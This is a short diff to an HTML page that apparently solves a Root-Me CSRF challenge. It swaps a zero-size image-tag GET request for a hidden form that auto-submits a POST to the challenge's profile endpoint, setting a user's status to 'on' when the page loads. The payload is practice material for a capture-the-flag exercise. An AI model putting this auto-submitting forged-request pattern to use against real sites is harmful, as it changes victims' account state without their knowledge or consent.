@@ -6,7 +6,13 @@
   </head>
   
   <body>
-      <img src="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile&username=user&status=1" height="0" width="0"> 
+      <form name="CSRF" method="post" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile">
+          <input type="hidden" name="username" value="user">
+          <input type="hidden" name="status" value="on">
+      </form>
+      <script>
+          document.CSRF.submit()
+      </script>
   </body>
 
 </html>
